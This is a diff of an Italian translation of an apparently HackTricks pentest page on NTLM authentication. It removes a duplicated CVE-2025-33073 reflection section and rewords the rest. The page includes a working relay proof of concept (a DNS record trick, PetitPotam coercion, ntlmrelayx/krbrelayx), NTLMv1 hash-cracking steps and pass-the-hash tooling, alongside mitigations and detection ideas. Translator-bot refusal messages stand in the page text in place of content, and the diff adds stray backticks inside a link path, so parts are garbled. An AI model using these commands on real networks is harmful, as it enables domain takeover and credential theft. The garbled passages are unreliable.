@@ -2,70 +2,25 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)
 
-Windows contiene diverse mitigazioni che cercano di prevenire attacchi di *reflection* in cui un'autenticazione NTLM (o Kerberos) che origina da un host viene ritrasmessa allo **stesso** host per ottenere privilegi di SYSTEM.
+## Informazioni di Base
 
-Microsoft ha interrotto la maggior parte delle catene pubbliche con MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) e patch successive, tuttavia **CVE-2025-33073** mostra che le protezioni possono ancora essere eluse abusando di come il **client SMB tronca i Service Principal Names (SPNs)** che contengono informazioni di destinazione *marshalled* (serializzate).
+In ambienti in cui sono in uso **Windows XP e Server 2003**, vengono utilizzati gli hash LM (Lan Manager), sebbene sia ampiamente riconosciuto che questi possano essere facilmente compromessi. Un particolare hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, indica uno scenario in cui LM non è impiegato, rappresentando l'hash per una stringa vuota.
 
-### TL;DR del bug
-1. Un attaccante registra un **record A DNS** il cui label codifica un SPN marshalled – ad esempio
-`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
-2. La vittima è costretta ad autenticarsi a quel nome host (PetitPotam, DFSCoerce, ecc.).
-3. Quando il client SMB passa la stringa di destinazione `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la chiamata a `CredUnmarshalTargetInfo` **rimuove** il blob serializzato, lasciando **`cifs/srv1`**.
-4. `msv1_0!SspIsTargetLocalhost` (o l'equivalente Kerberos) ora considera la destinazione come *localhost* perché la parte breve dell'host corrisponde al nome del computer (`SRV1`).
-5. Di conseguenza, il server imposta `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inietta **il token di accesso SYSTEM di LSASS** nel contesto (per Kerberos viene creato un key di subsessione contrassegnato come SYSTEM).
-6. Ritrasmettere quell'autenticazione con `ntlmrelayx.py` **o** `krbrelayx.py` fornisce pieni diritti di SYSTEM sullo stesso host.
-
-### Quick PoC
-```bash
-# Add malicious DNS record
-dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
--a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
--d 10.10.10.50
-
-# Trigger authentication
-PetitPotam.py -u user -p pass -d DOMAIN \
-srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL
-
-# Relay listener (NTLM)
-ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
-
-# Relay listener (Kerberos) – remove NTLM mechType first
-krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
-```
-### Patch & Mitigations
-* La patch KB per **CVE-2025-33073** aggiunge un controllo in `mrxsmb.sys::SmbCeCreateSrvCall` che blocca qualsiasi connessione SMB il cui target contiene informazioni marshallate (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
-* Forzare la **firma SMB** per prevenire la riflessione anche su host non patchati.
-* Monitorare i record DNS che somigliano a `*<base64>...*` e bloccare i vettori di coercizione (PetitPotam, DFSCoerce, AuthIP...).
-
-### Detection ideas
-* Catture di rete con `NTLMSSP_NEGOTIATE_LOCAL_CALL` dove l'IP del client ≠ l'IP del server.
-* Kerberos AP-REQ contenente una chiave di sottosessione e un principale client uguale al nome host.
-* Accessi al sistema Windows Event 4624/4648 immediatamente seguiti da scritture SMB remote dallo stesso host.
-
-## References
-* [Synacktiv – NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
-* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
-
-## Basic Information
-
-In ambienti dove **Windows XP e Server 2003** sono in uso, vengono utilizzati hash LM (Lan Manager), anche se è ampiamente riconosciuto che questi possono essere facilmente compromessi. Un particolare hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, indica uno scenario in cui LM non è impiegato, rappresentando l'hash per una stringa vuota.
-
-Per impostazione predefinita, il protocollo di autenticazione **Kerberos** è il metodo principale utilizzato. NTLM (NT LAN Manager) interviene in circostanze specifiche: assenza di Active Directory, inesistenza del dominio, malfunzionamento di Kerberos a causa di una configurazione errata, o quando vengono tentate connessioni utilizzando un indirizzo IP anziché un nome host valido.
+Per impostazione predefinita, il protocollo di autenticazione **Kerberos** è il metodo principale utilizzato. NTLM (NT LAN Manager) interviene in circostanze specifiche: assenza di Active Directory, inesistenza del dominio, malfunzionamento di Kerberos a causa di una configurazione errata, o quando si tentano connessioni utilizzando un indirizzo IP anziché un nome host valido.
 
 La presenza dell'intestazione **"NTLMSSP"** nei pacchetti di rete segnala un processo di autenticazione NTLM.
 
 Il supporto per i protocolli di autenticazione - LM, NTLMv1 e NTLMv2 - è facilitato da un DLL specifico situato in `%windir%\Windows\System32\msv1\_0.dll`.
 
-**Key Points**:
+**Punti Chiave**:
 
-- Gli hash LM sono vulnerabili e un hash LM vuoto (`AAD3B435B51404EEAAD3B435B51404EE`) segnala il suo non utilizzo.
+- Gli hash LM sono vulnerabili e un hash LM vuoto (`AAD3B435B51404EEAAD3B435B51404EE`) ne segnala la non utilizzazione.
 - Kerberos è il metodo di autenticazione predefinito, con NTLM utilizzato solo in determinate condizioni.
 - I pacchetti di autenticazione NTLM sono identificabili dall'intestazione "NTLMSSP".
 - I protocolli LM, NTLMv1 e NTLMv2 sono supportati dal file di sistema `msv1\_0.dll`.
 
-## LM, NTLMv1 and NTLMv2
+## LM, NTLMv1 e NTLMv2
 
 Puoi controllare e configurare quale protocollo sarà utilizzato:
 
@@ -75,7 +30,7 @@ Esegui _secpol.msc_ -> Politiche locali -> Opzioni di sicurezza -> Sicurezza di 
 
 ![](<../../images/image (919).png>)
 
-### Registry
+### Registro
 
 Questo imposterà il livello 5:
 ```
@@ -116,7 +71,7 @@ L'**hash NT (16byte)** è diviso in **3 parti di 7byte ciascuna** (7B + 7B + (2B
 - Mancanza di **randomness**
 - Le 3 parti possono essere **attaccate separatamente** per trovare l'hash NT
 - **DES è crackabile**
-- La 3ª chiave è sempre composta da **5 zeri**.
+- La 3º chiave è sempre composta da **5 zeri**.
 - Dato la **stessa sfida**, la **risposta** sarà **la stessa**. Quindi, puoi dare come **sfida** alla vittima la stringa "**1122334455667788**" e attaccare la risposta utilizzando **tabelle rainbow precompute**.
 
 ### Attacco NTLMv1
@@ -189,13 +144,13 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-It seems that you haven't provided the text you want to be translated. Please share the relevant English text, and I'll be happy to translate it into Italian for you.
+Mi dispiace, ma non hai fornito il testo da tradurre. Per favore, invia il contenuto che desideri tradurre in italiano.
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
-I'm sorry, but I need the specific text you would like me to translate in order to assist you. Please provide the content you want translated.
+I'm sorry, but I need the specific text you would like me to translate. Please provide the content you want translated to Italian.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
@@ -205,14 +160,14 @@ La **lunghezza della sfida è di 8 byte** e **vengono inviati 2 risposte**: una 
 
 **La prima risposta** è creata cifrando usando **HMAC_MD5** la **stringa** composta dal **client e dal dominio** e usando come **chiave** l'**hash MD4** dell'**NT hash**. Poi, il **risultato** sarà usato come **chiave** per cifrare usando **HMAC_MD5** la **sfida**. A questo, **verrà aggiunta una sfida del client di 8 byte**. Totale: 24 B.
 
-La **seconda risposta** è creata usando **diversi valori** (una nuova sfida del client, un **timestamp** per evitare **attacchi di replay**...)
+La **seconda risposta** è creata usando **diversi valori** (una nuova sfida del client, un **timestamp** per evitare **attacchi di ripetizione**...)
 
 Se hai un **pcap che ha catturato un processo di autenticazione riuscito**, puoi seguire questa guida per ottenere il dominio, il nome utente, la sfida e la risposta e provare a craccare la password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
 **Una volta che hai l'hash della vittima**, puoi usarlo per **impersonarla**.\
-Devi usare un **tool** che **eseguirà** l'**autenticazione NTLM usando** quell'**hash**, **oppure** potresti creare un nuovo **sessionlogon** e **iniettare** quell'**hash** all'interno del **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, quell'**hash verrà utilizzato.** L'ultima opzione è ciò che fa mimikatz.
+Devi usare un **tool** che **eseguirà** l'**autenticazione NTLM usando** quell'**hash**, **oppure** potresti creare un nuovo **sessionlogon** e **iniettare** quell'**hash** all'interno di **LSASS**, così quando viene eseguita qualsiasi **autenticazione NTLM**, quell'**hash verrà utilizzato.** L'ultima opzione è ciò che fa mimikatz.
 
 **Per favore, ricorda che puoi eseguire attacchi Pass-the-Hash anche usando account di computer.**
 
@@ -286,7 +241,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 ## Attacco Internal Monologue
 
-L'Attacco Internal Monologue è una tecnica di estrazione delle credenziali furtiva che consente a un attaccante di recuperare gli hash NTLM dalla macchina di una vittima **senza interagire direttamente con il processo LSASS**. A differenza di Mimikatz, che legge gli hash direttamente dalla memoria ed è frequentemente bloccato da soluzioni di sicurezza degli endpoint o Credential Guard, questo attacco sfrutta **chiamate locali al pacchetto di autenticazione NTLM (MSV1_0) tramite l'Interfaccia di Supporto alla Sicurezza (SSPI)**. L'attaccante prima **degrada le impostazioni NTLM** (ad es., LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) per garantire che NetNTLMv1 sia consentito. Poi impersona i token utente esistenti ottenuti da processi in esecuzione e attiva l'autenticazione NTLM localmente per generare risposte NetNTLMv1 utilizzando una sfida nota.
+L'Attacco Internal Monologue è una tecnica furtiva di estrazione delle credenziali che consente a un attaccante di recuperare gli hash NTLM dalla macchina di una vittima **senza interagire direttamente con il processo LSASS**. A differenza di Mimikatz, che legge gli hash direttamente dalla memoria ed è frequentemente bloccato da soluzioni di sicurezza degli endpoint o Credential Guard, questo attacco sfrutta **chiamate locali al pacchetto di autenticazione NTLM (MSV1_0) tramite l'Interfaccia di Supporto alla Sicurezza (SSPI)**. L'attaccante prima **degrada le impostazioni NTLM** (ad es., LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) per garantire che NetNTLMv1 sia consentito. Poi impersona i token utente esistenti ottenuti da processi in esecuzione e attiva l'autenticazione NTLM localmente per generare risposte NetNTLMv1 utilizzando una sfida nota.
 
 Dopo aver catturato queste risposte NetNTLMv1, l'attaccante può rapidamente recuperare gli hash NTLM originali utilizzando **tabelle rainbow precompute**, abilitando ulteriori attacchi Pass-the-Hash per il movimento laterale. Fondamentalmente, l'Attacco Internal Monologue rimane furtivo perché non genera traffico di rete, non inietta codice e non attiva dump di memoria diretti, rendendolo più difficile da rilevare per i difensori rispetto ai metodi tradizionali come Mimikatz.
 
@@ -301,7 +256,7 @@ Il PoC può essere trovato in **[https://github.com/eladshamir/Internal-Monologu
 **Leggi una guida più dettagliata su come eseguire questi attacchi qui:**
 
 {{#ref}}
-../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
+../../generic-methodologies-and-resources/pentesting-network/`spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md`
 {{#endref}}
 
 ## Analizza le sfide NTLM da una cattura di rete
@@ -318,9 +273,9 @@ Microsoft ha interrotto la maggior parte delle catene pubbliche con MS08-068 (SM
 1. Un attaccante registra un **record A DNS** il cui label codifica un SPN marshalled – ad es.
 `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
 2. La vittima è costretta ad autenticarsi a quel nome host (PetitPotam, DFSCoerce, ecc.).
-3. Quando il client SMB passa la stringa di destinazione `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la chiamata a `CredUnmarshalTargetInfo` **strippa** il blob serializzato, lasciando **`cifs/srv1`**.
+3. Quando il client SMB passa la stringa di destinazione `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la chiamata a `CredUnmarshalTargetInfo` **rimuove** il blob serializzato, lasciando **`cifs/srv1`**.
 4. `msv1_0!SspIsTargetLocalhost` (o l'equivalente Kerberos) ora considera la destinazione come *localhost* perché la parte breve dell'host corrisponde al nome del computer (`SRV1`).
-5. Di conseguenza, il server imposta `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inietta **il token di accesso SYSTEM di LSASS** nel contesto (per Kerberos viene creato un key di subsessione contrassegnato come SYSTEM).
+5. Di conseguenza, il server imposta `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inietta **il token di accesso SYSTEM di LSASS** nel contesto (per Kerberos viene creato un chiave di sottosessione contrassegnata come SYSTEM).
 6. Ritrasmettere quell'autenticazione con `ntlmrelayx.py` **o** `krbrelayx.py` conferisce pieni diritti di SYSTEM sullo stesso host.
 
 ### Quick PoC
@@ -340,17 +295,17 @@ ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 # Relay listener (Kerberos) – remove NTLM mechType first
 krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ```
-### Patch & Mitigations
-* La patch KB per **CVE-2025-33073** aggiunge un controllo in `mrxsmb.sys::SmbCeCreateSrvCall` che blocca qualsiasi connessione SMB il cui target contiene informazioni marshallate (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
+### Patch & Mitigazioni
+* La patch KB per **CVE-2025-33073** aggiunge un controllo in `mrxsmb.sys::SmbCeCreateSrvCall` che blocca qualsiasi connessione SMB il cui obiettivo contiene informazioni marshallate (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
 * Forzare la **firma SMB** per prevenire la riflessione anche su host non patchati.
 * Monitorare i record DNS che somigliano a `*<base64>...*` e bloccare i vettori di coercizione (PetitPotam, DFSCoerce, AuthIP...).
 
-### Detection ideas
+### Idee di rilevamento
 * Catture di rete con `NTLMSSP_NEGOTIATE_LOCAL_CALL` dove l'IP del client ≠ l'IP del server.
 * Kerberos AP-REQ contenente una chiave di sottosessione e un principale client uguale al nome host.
 * Accessi al sistema Windows Event 4624/4648 immediatamente seguiti da scritture SMB remote dallo stesso host.
 
-## References
+## Riferimenti
 * [Synacktiv – NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
 * [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
 
